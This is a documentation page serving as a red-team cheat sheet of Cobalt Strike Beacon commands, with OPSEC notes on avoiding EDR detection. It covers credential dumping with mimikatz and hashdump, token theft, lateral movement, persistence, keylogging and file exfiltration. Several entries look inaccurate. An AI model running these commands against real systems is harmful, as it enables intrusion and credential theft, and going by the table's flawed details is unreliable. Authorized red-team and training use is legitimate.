---
id: cobalt-strike-command-ref
title: Cobalt Strike Command Reference
description: A categorized cheat sheet of Cobalt Strike Beacon commands with syntax, notes, and OPSEC guidance.
slug: /reference/cobalt-strike
sidebar_label: Cobalt Strike
sidebar_position: 1
tags:
  - cobalt-strike
  - red-team
  - beacon
  - command-reference
  - post-exploitation
---

---

# 🧾 **Legend**


| 🔹 Field         | 🔹 Description                                      |
|------------------|-----------------------------------------------------|
| **Category**     | Tactic or phase in attack lifecycle                 |
| **Command**      | Beacon command name                                 |
| **Syntax**       | Usage format                                        |
| **Notes**        | Clarification or common use case                    |
| **OPSEC Notes**  | Warnings, noisy indicators, artifact creation, etc. |

---

##  **1. Reconnaissance / Situational Awareness**

| Command         | Syntax                         | Notes                                       | OPSEC Notes                      |
|----------------|--------------------------------|---------------------------------------------|----------------------------------|
| `whoami`        | `whoami`                       | Shows current user                          | Low risk                         |
| `ipconfig`      | `ipconfig`                     | Shows IP configuration                      | May trigger detection if frequent |
| `netstat`       | `netstat`                      | Lists network connections                   | Avoid on monitored endpoints     |
| `net time`      | `net time`                     | Show domain time source                     | Low risk                         |
| `net view`      | `net view /domain`             | Enumerate shares                             | Can trigger alerts               |
| `net users`     | `net users`                    | Lists local users                            | May be noisy on monitored hosts  |
| `getuid`        | `getuid`                       | Shows Beacon’s running user                 | Safer alternative to `whoami`    |
| `getsystem`     | `getsystem`                    | Elevation attempt using known token techniques | Can trigger AV/EDR              |

---

##  **2. Credential Access**

| Command         | Syntax                           | Notes                                   | OPSEC Notes                            |
|----------------|----------------------------------|-----------------------------------------|----------------------------------------|
| `mimikatz`      | `mimikatz logonpasswords`        | Invoke Mimikatz directly in memory       | Highly detectable (EDR/AV signatures)  |
| `hashdump`      | `hashdump`                       | Dump local SAM hashes                    | Noisy, can be logged                   |
| `creds`         | `creds`                          | Show harvested credentials               | Internal only                          |
| `kerberos_ticket_purge` | `kerberos_ticket_purge`       | Purge Kerberos tickets from memory       | Safe                                   |

---

##  **3. Privilege Escalation**

| Command         | Syntax                         | Notes                                         | OPSEC Notes                            |
|----------------|--------------------------------|-----------------------------------------------|----------------------------------------|
| `getsystem`     | `getsystem`                   | Token impersonation + service abuse           | May create service artifacts           |
| `rev2self`      | `rev2self`                    | Revert token impersonation                    | Safe                                   |
| `steal_token`   | `steal_token [pid]`           | Steal access token from another process       | Requires target PID                    |
| `make_token`    | `make_token user pass`        | Use plaintext creds to impersonate a user     | May fail silently if creds invalid     |

---

##  **4. Lateral Movement**

| Command           | Syntax                                  | Notes                                           | OPSEC Notes                            |
|------------------|-----------------------------------------|-------------------------------------------------|----------------------------------------|
| `jump`            | `jump smb [host] [listener]`            | SMB beacon lateral move                         | Spawns new beacon over SMB             |
| `psexec`          | `psexec [target] [listener]`            | Uses Admin shares to run a payload              | Creates services/logs                  |
| `winrm`           | `jump winrm [target] [listener]`        | Move via WinRM (if enabled)                     | Less noisy than SMB/PSExec             |
| `psinject`        | `psinject [pid] [payload]`              | Inject payload into another process            | Dangerous if EDR hooks injection       |

---

##  **5. Persistence**

| Command         | Syntax                                 | Notes                                   | OPSEC Notes                      |
|----------------|----------------------------------------|-----------------------------------------|----------------------------------|
| `schtasks`      | `schtasks /create ...`                 | Schedule tasks for beacon persistence   | Very detectable via logs         |
| `reg`           | `reg add ...`                          | Registry persistence options             | Monitored paths are high risk    |
| `backdoor`      | `backdoor_add [type]`                  | Persist via userinit, shell, etc.        | Artifact-heavy, use with caution |

---

##  **6. Post-Exploitation**

| Command           | Syntax                              | Notes                                          | OPSEC Notes                     |
|------------------|-------------------------------------|------------------------------------------------|---------------------------------|
| `shell`           | `shell [cmd]`                       | Run cmd.exe command                            | Can be logged by EDR            |
| `powershell`      | `powershell [cmd]`                  | Run PS command in memory                       | Flagged by AMSI & logs          |
| `execute-assembly`| `execute-assembly [exe]`            | Run .NET assembly in memory                    | Preferred over dropping .exe    |
| `dllload`         | `dllload [dll]`                     | Load and run a DLL                             | Use signed DLLs for stealth     |
| `inline-execute`  | `inline-execute` (CS 4.8+)          | Run code inline (C#)                           | Stealthier .NET option          |

---

##  **7. Data Exfiltration**

| Command        | Syntax                         | Notes                               | OPSEC Notes                  |
|---------------|--------------------------------|-------------------------------------|------------------------------|
| `download`     | `download [file]`              | Fetch file from target              | Triggered by DLP systems     |
| `upload`       | `upload [file]`                | Upload file to target               | Often triggers logging       |
| `log keystrokes` | `keylogger`                 | Starts keylogger                    | Logs to disk, high OPSEC risk|

---

##  **8. Cleanup / Cover Tracks**

| Command       | Syntax                 | Notes                                 | OPSEC Notes                        |
|--------------|------------------------|---------------------------------------|------------------------------------|
| `rm`          | `rm [file]`           | Deletes file                          | May trigger file deletion alerts   |
| `clear`       | `clear`               | Clears screen output                  | Harmless                          |
| `exit`        | `exit`                | Close current beacon                  | Safe                              |

---

## 🛡️ **Recommended OPSEC Practices**

| Tip                                | Description                                                                 |
|-----------------------------------|-----------------------------------------------------------------------------|
| Avoid `mimikatz` unless needed    | It’s heavily signatured; use safer token manipulation when possible         |
| Use `execute-assembly` over `shell` or `powershell` | Less likely to trigger AV/EDR since it stays in-memory           |
| Prefer `jump winrm` over `psexec` | Lower IOCs and cleaner on logs                                              |
| Use `sleep`                        | Introduce jitter/delay to avoid rapid command execution                     |
| Log and timestamp actions          | For traceability and red team debriefing                                    |

---
